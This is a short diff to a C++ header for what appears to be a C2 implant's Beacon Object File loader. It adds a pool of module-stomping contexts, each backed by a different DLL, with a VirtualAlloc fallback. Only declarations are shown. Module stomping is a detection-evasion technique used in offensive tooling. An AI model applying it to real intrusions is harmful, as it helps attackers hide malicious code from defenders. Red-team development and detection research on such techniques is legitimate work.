@@ -37,6 +37,13 @@ struct AsyncBofContext {
 
 extern __declspec(thread) AsyncBofContext* tls_CurrentBofContext;
 
+#define BOF_STOMP_POOL_MAX 32
+
+struct StompSlot {
+    BOF_STOMP_CTX* ctx;       // NULL = slot libre
+    BOOL           inUse;
+};
+
 class Boffer
 {
 public:
@@ -44,6 +51,17 @@ public:
 
     HANDLE  wakeupEvent;
     CRITICAL_SECTION managerLock;
+
+    // Pool de BOF_STOMP_CTX* para BOFs asíncronos.
+    // Cada slot se inicializa en Initialize() con una DLL distinta del pool.
+    // AcquireStompSlot() toma uno libre; ReleaseStompSlot() lo libera.
+    // Si no hay slots libres, devuelve NULL → AsyncBofThreadProc cae a VirtualAlloc.
+    StompSlot        stompPool[BOF_STOMP_POOL_MAX];
+    int              stompPoolSize;
+    CRITICAL_SECTION stompPoolLock;
+
+    BOF_STOMP_CTX* AcquireStompSlot();
+    void           ReleaseStompSlot(BOF_STOMP_CTX* ctx);
 
     Boffer();
     ~Boffer();
